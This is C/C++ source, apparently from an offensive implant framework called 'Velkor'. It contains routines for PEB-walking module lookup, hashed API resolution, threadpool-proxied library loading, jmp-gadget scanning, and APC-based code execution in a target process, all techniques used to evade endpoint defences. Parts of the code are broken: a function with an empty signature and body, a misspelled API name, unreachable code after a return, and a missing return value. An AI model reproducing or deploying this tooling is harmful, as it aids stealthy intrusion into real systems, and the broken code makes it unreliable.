#include <Velkor.h>

D_SEC( B ) BOOL ResolveRelocation( 
    _In_ 
    _In_ PBYTE ImageBase,
    _In_ ULONG Offset
) {

}

D_SEC( B ) VOID volatile ___chkstk_ms(
        VOID
) { __asm__( "nop" ); }

EXTERN_C VOID CALLBACK CallbackLoadLib( PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work );

EXTERN_C D_SEC( B ) ULONG_PTR LoadLibraryPtr() { return U_64( LdrLoadFunc( LdrLoadModule( XprKernel32 ), XPR( "LoadLibraryA" ) ) ); }

D_SEC( B ) PVOID LdrLoadModule2(
    _In_ PSTR ModuleName
) {
    VELKOR_INSTANCE

    PTP_WORK WorkReturn = { 0 };
    PVOID Clck = &CallbackLoadLib;
    Clck =  C_PTR( U_64( Velkor->VelkorMemory.Full.Start ) + U_64( Clck ) );
    VkShow( "%p %p\n", Clck, Velkor->VelkorMemory.Full.Start );
    VkCall<VOID>( XprNtdll, XPR( "TpAllocWork" ), &WorkReturn, (PTP_WORK_CALLBACK)Clck, ModuleName, NULL );
    VkCall<VOID>( XprNtdll, XPR( "TpPostWork" ), WorkReturn );
    VkCall<VOID>( XprNtdll, XPR( "TpReleaseWork" ), WorkReturn );

    VkCall<VOID>( XprKernel32, XPR( "WairForSingleObject" ), NtCurrentProcess(), 1000 );

    return LdrLoadModule( XPR( ModuleName ) );
}

D_SEC( B ) PVOID LdrLoadModule(
    _In_ ULONG Hash
) { 
    PLDR_DATA_TABLE_ENTRY Data  = { 0 };
    PLIST_ENTRY           Head  = { 0 };
    PLIST_ENTRY           Entry = { 0 };

    CHAR cDllName[256] = { 0 };

    Head  = &NtCurrentTeb()->ProcessEnvironmentBlock->Ldr->InLoadOrderModuleList;
    Entry = Head->Flink;

    if ( !Hash ) {
        Data = (PLDR_DATA_TABLE_ENTRY)( Entry );
        return Data->DllBase;
    }

    for ( ; Head != Entry ; Entry = Entry->Flink ) {
        Data = (PLDR_DATA_TABLE_ENTRY)( Entry );

        VkStr::WCharToChar( cDllName, Data->BaseDllName.Buffer, Data->BaseDllName.MaximumLength );
        
        if ( HashString( cDllName, 0 ) == Hash ) {
            return Data->DllBase;
        }
    }

    return NULL;
}

D_SEC( B ) PVOID LdrLoadFunc( 
    _In_ PVOID BaseModule, 
    _In_ ULONG FuncName 
) {
    if ( !BaseModule ) return NULL;

    VELKOR_INSTANCE

    PIMAGE_NT_HEADERS       pImgNt         = { 0 };
    PIMAGE_EXPORT_DIRECTORY pImgExportDir  = { 0 };
    DWORD                   ExpDirSz       = 0x00;
    PDWORD                  AddrOfFuncs    = NULL;
    PDWORD                  AddrOfNames    = NULL;
    PWORD                   AddrOfOrdinals = NULL;
    PVOID                   FuncAddr       = NULL;

    pImgNt          = (PIMAGE_NT_HEADERS)( B_PTR( BaseModule ) + ((PIMAGE_DOS_HEADER)BaseModule)->e_lfanew );
    pImgExportDir   = (PIMAGE_EXPORT_DIRECTORY)( B_PTR( BaseModule ) + pImgNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress );
    ExpDirSz        = U_64( B_PTR( BaseModule ) + pImgNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size );

    AddrOfNames     = (PDWORD)( B_PTR( BaseModule ) + pImgExportDir->AddressOfNames );
    AddrOfFuncs     = (PDWORD)( B_PTR( BaseModule ) + pImgExportDir->AddressOfFunctions );
    AddrOfOrdinals  = (PWORD )( B_PTR( BaseModule ) + pImgExportDir->AddressOfNameOrdinals );

    for ( int i = 0 ; i < pImgExportDir->NumberOfNames ; i++ ) {
        PCHAR pFuncName         = A_PTR( B_PTR( BaseModule ) + AddrOfNames[i] );
        PVOID pFunctionAddress  = C_PTR( B_PTR( BaseModule ) + AddrOfFuncs[AddrOfOrdinals[i]] );

        if ( HashString( pFuncName, 0 ) == FuncName ) {
            if (( U_64( pFunctionAddress ) >= U_64( pImgExportDir ) ) &&
                ( U_64( pFunctionAddress )  < U_64( pImgExportDir ) + ExpDirSz ) ) {

                return (PVOID)VkCall<FARPROC>( XprKernel32, XPR( "GetProcAddress" ), (HMODULE)( BaseModule ), pFuncName );

                CHAR  ForwarderName[MAX_PATH] = { 0 };
                DWORD dwOffset                = 0x00;
                PCHAR FuncMod                 = NULL;
                PCHAR nwFuncName              = NULL;

                VkMem::Copy( C_PTR( ForwarderName ), pFunctionAddress, VkStr::LengthA( (PCHAR)pFunctionAddress ) );

                for ( int j = 0 ; j < VkStr::LengthA( (PCHAR)ForwarderName ) ; j++ ) {
                    if (((PCHAR)ForwarderName)[j] == '.') {
                        dwOffset         = j;
                        ForwarderName[j] = '\0';
                        break;
                    }
                }

                FuncMod    = ForwarderName;
                nwFuncName = ForwarderName + dwOffset + 1;

                fnLoadLibraryA pLoadLibraryA = (fnLoadLibraryA)LdrLoadFunc( LdrLoadModule( XprKernel32 ), XPR( "LoadLibraryA" ) );
                HMODULE hForwardedModule = pLoadLibraryA( FuncMod );

                if ( hForwardedModule ) {
                    if ( nwFuncName[0] == '#' ) {
                        UINT64 ordinal = U_64( nwFuncName + 1 );
                        return (PVOID)LdrLoadFunc( hForwardedModule, HashString( A_PTR( ordinal ), 0 ) );
                    } else {
                        return (PVOID)LdrLoadFunc( hForwardedModule, HashString( nwFuncName, 0 ) );
                    }
                }

                return NULL;
            }

            return C_PTR( pFunctionAddress );
        }
    }

    return NULL;
}

D_SEC( B ) ULONG Random32(
	void
) {
    UINT32 Seed = 0;
    
    // _rdrand32_step( &Seed );
    __asm__ __volatile__ (
        "rdrand %0" : "=r" (Seed)
    );
    return Seed;
}

D_SEC( B ) ULONG HashString(
    _In_ PCHAR  String,
    _In_ SIZE_T Length
) {
    ULONG  Hash  = H_MAGIC_KEY;
    PUCHAR Ptr  = { 0 };
    UCHAR  Char = { 0 };

    if ( ! String ) {
        return 0;
    }

    Ptr  = ( ( PUCHAR ) String );

    do {
        Char = *Ptr;

        if ( ! Length ) {
            if ( ! *Ptr ) break;
        } else {
            if ( U_64( Ptr - U_64( String ) ) >= Length ) break;
            if ( !*Ptr ) ++Ptr;
        }

        if ( Char >= 'a' ) {
            Char -= 0x20;
        }

        Hash = ( ( Hash << H_MAGIC_SEED ) + Hash ) + Char;

        ++Ptr;
    } while ( TRUE );

    return Hash;
}

D_SEC( B ) PVOID FindJmpGadget(
    _In_ PVOID  ModuleBase,
    _In_ UINT16 RegValue
) {
    SIZE_T Gadget      = 0;
    PBYTE  SearchBase  = NULL;
    SIZE_T SearchSize  = 0;
    UINT16 JmpValue    = 0xff;

    SearchBase = B_PTR( ModuleBase + 0x1000 );
    SearchSize = 0x1000 * 0x1000;    

    for ( INT i = 0; i < SearchSize - 1; i++ ) {
        if ( SearchBase[i] == JmpValue && SearchBase[i+1] == RegValue ) {
            Gadget = U_64( SearchBase + i ); break;
        }
    }

    return C_PTR( Gadget );
}

D_SEC( B ) PSTR ErrorHandler(
    _In_ UINT32 ErrorCode,
    _In_ PSTR   InputString
) {
    VELKOR_INSTANCE

    CHAR ErrorMessage[MAX_PATH] = { 0 };
    PSTR p = ErrorMessage;

    VkCall<UINT32>( 
        XprKernel32, XPR( "FormatMessageA" ),
        FORMAT_MESSAGE_FROM_SYSTEM | 
        FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL, ErrorCode,
        MAKELANGID( LANG_NEUTRAL, SUBLANG_DEFAULT ),
        ErrorMessage, MAX_PATH, NULL 
    );

    while ( *p++ ) {
        if ( ( *p != 9 && *p < 32 ) || *p == 46 )
        {
            *p = 0;
            break;
        }
    }

    VkShow( "{ERR} %s failed with error code: %d (%s)\n", InputString, ErrorCode, ErrorMessage );

    return p;
}

D_SEC( B ) BOOL CallbackAPC(
    _In_     HANDLE ProcessHandle,
    _In_     PVOID  FunctionPtr,
    _In_opt_ PVOID  Parameter,
    _In_opt_ SIZE_T BufferSize
) {
    VELKOR_INSTANCE

    HANDLE      ThreadHandle = NULL;
    NTSTATUS    NtStatus     = STATUS_SUCCESS;

    ULONG ThreadId = 0;

    ThreadHandle = VkThread::Create( 0, FuncPtr.RtlExitUserThread, 0, CREATE_SUSPENDED, &ThreadId, ProcessHandle );

    if ( BufferSize ) {
        for ( INT i = 0; i < BufferSize; i++ ) {
            NtStatus = VkCall<NTSTATUS>( XprNtdll, XPR( "NtQueueApcThread" ), ThreadHandle, FunctionPtr, ( Parameter + i ), 1, ( Parameter + i ) );
        }
    } else {
        NtStatus = VkCall<NTSTATUS>( XprNtdll, XPR( "NtQueueApcThread" ), ThreadHandle, FunctionPtr, Parameter, 0, NULL );
    }
   
    if ( NtStatus != STATUS_SUCCESS ) {
        VkThread::Terminate( ThreadHandle, STATUS_SUCCESS );
        VkCall<VOID>( XprNtdll, XPR( "NtClose" ), ThreadHandle );
        return FALSE;
    } else {
        VkThread::Resume( ThreadHandle );
        VkShow( "thread created succefully %d", ThreadId );
        VkCall<VOID>( XprKernel32, XPR( "WaitForSingleObject" ), ThreadHandle, INFINITE );
        VkCall<VOID>( XprNtdll, XPR( "NtClose" ), ThreadHandle );
        return TRUE;
    }
}

D_SEC( B ) PWSTR GetEnv(
    VOID
) {
    VELKOR_INSTANCE

    PWSTR TmpVal = W_PTR( Velkor->Teb->ProcessEnvironmentBlock->ProcessParameters->Environment );

    while( 1 ) {
        INT x = VkStr::LengthW( TmpVal );

        if ( !x ) {
            TmpVal = NULL; break;
        }

        VkShow( "Each: %ws\n", TmpVal );

        TmpVal = TmpVal + ( x + sizeof( CHAR ) );
    }

    return;
}